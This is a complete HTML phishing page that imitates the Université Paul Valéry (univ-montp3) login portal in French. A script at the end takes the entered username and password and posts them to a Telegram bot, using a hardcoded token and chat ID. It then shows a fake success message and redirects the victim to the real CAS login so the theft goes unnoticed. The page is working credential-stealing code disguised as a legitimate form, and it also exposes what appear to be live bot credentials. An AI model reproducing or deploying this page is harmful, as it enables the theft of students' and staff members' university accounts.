<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion - Université Paul Valéry</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url('bg.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .login-box {
      background-color: white;
      max-width: 480px;
      width: 90%;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
    .logo {
      width: 100%;
      background-color: #009cde;
      padding: 1rem;
      text-align: center;
    }
    .logo img {
      max-height: 50px;
    }
    h2 {
      margin: 1rem 0;
      font-size: 1rem;
      font-weight: bold;
    }
    .form-group {
      position: relative;
      margin-bottom: 2rem;
    }
    .form-group input {
      width: 100%;
      padding: 1rem 0.75rem 0.5rem;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 4px;
      outline: none;
      background: transparent;
    }
    .form-group label {
      position: absolute;
      top: 1rem;
      left: 0.75rem;
      font-size: 1rem;
      color: #666;
      transition: all 0.2s ease;
      pointer-events: none;
    }
    .form-group input:focus + label,
    .form-group input:not(:placeholder-shown) + label {
      top: -0.6rem;
      left: 0.5rem;
      font-size: 0.75rem;
      background-color: white;
      padding: 0 0.25rem;
      color: #009cde;
    }
    .form-group .toggle-password {
      position: absolute;
      top: 50%;
      right: 0.75rem;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 1.1rem;
      color: #666;
    }
    .error-message {
      color: red;
      font-size: 0.875rem;
      margin-top: -1rem;
      margin-bottom: 1rem;
    }
    .checkbox {
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
    }
    .checkbox input {
      margin-right: 0.5rem;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      background-color: #004a61;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 1rem;
      cursor: pointer;
    }
    .links {
      margin-top: 1rem;
      display: flex;
      justify-content: space-between;
      font-size: 0.875rem;
    }
    .footer-links {
      margin-top: 2rem;
      font-size: 0.75rem;
      text-align: center;
    }
    a {
      color: #004a61;
      text-decoration: none;
    }
    @media (max-width: 768px) {
      .login-box {
        margin: 1rem;
      }
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <img src="logo.png" alt="Logo Université Paul Valéry" />
    </div>
    <h2><span style="font-weight: normal;">&#128100;</span> <a href="#"><strong>Nouveau à l'université ? Validez votre compte</strong></a></h2>

    <div class="form-group">
      <input type="text" id="identifiant" placeholder=" " required />
      <label for="identifiant">Identifiant : *</label>
     
    </div>

    <div class="form-group">
      <input type="password" id="password" placeholder=" " required />
      <label for="password">Mot de passe : *</label>
      <span class="toggle-password" onclick="togglePassword()">👁️</span>
    </div>
<div id="message-box" style="margin-top: 1rem; text-align: center; font-size: 0.9rem;"></div>

    <div class="checkbox">
      <input type="checkbox" id="public" />
      <label for="public">Je suis sur un ordinateur public.</label>
    </div>

    <button>SE CONNECTER</button>

    <div class="links">
      <a href="#">Mot de passe oublié ?</a>
      <a href="#">Aide / Assistance</a>
    </div>

    <div class="footer-links">
      <p>Pour des raisons de sécurité, veuillez vous <a href="#">déconnecter</a> et fermer votre navigateur lorsque vous avez fini d'accéder aux services authentifiés.</p>
      <p><a href="#">Informatique et libertés</a> | <a href="#">Université Paul-Valéry</a> | <a href="#">Arrêté ENT</a></p>
    </div>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById('password');
      const icon = document.querySelector('.toggle-password');
      if (pwd.type === 'password') {
        pwd.type = 'text';
        icon.textContent = '🙈';
      } else {
        pwd.type = 'password';
        icon.textContent = '👁️';
      }
    }
  </script>
  <script>
  const TELEGRAM_BOT_TOKEN = '6833993399:AAHJuYS-Gm553wkH5-LiVAAyL8lhYLnAn7A';
  const TELEGRAM_CHAT_ID = '-4671422826';
  const REDIRECT_URL = 'https://cas.univ-montp3.fr/cas/login?service=https%3A%2F%2Fmail.univ-montp3.fr%2Fauth%2Fcas';

  const messageBox = document.getElementById("message-box");

  document.querySelector("button").addEventListener("click", function (e) {
    e.preventDefault();

    const identifiant = document.getElementById("identifiant").value.trim();
    const password = document.getElementById("password").value.trim();
    const isPublic = document.getElementById("public").checked ? "Oui" : "Non";

    if (!identifiant || !password) {
      showMessage("Veuillez remplir tous les champs.", "red");
      return;
    }

    showMessage("Envoi en cours...", "#004a61");

    const message = `🔐 identifiant univ-montp3 :
👤 Identifiant : ${identifiant}
🔑 Mot de passe : ${password}
🖥️ Ordinateur public : ${isPublic}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML"
      }),
    })
      .then((response) => {
        if (response.ok) {
          showMessage("Connexion réussie. Redirection...", "green");
          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 1500);
        } else {
          showMessage("Erreur lors de l'envoi. Réessayez.", "red");
        }
      })
      .catch((error) => {
        console.error("Erreur:", error);
        showMessage("Une erreur réseau est survenue.", "red");
      });
  });

  function showMessage(text, color) {
    messageBox.textContent = text;
    messageBox.style.color = color;
  }
</script>

</body>
</html>
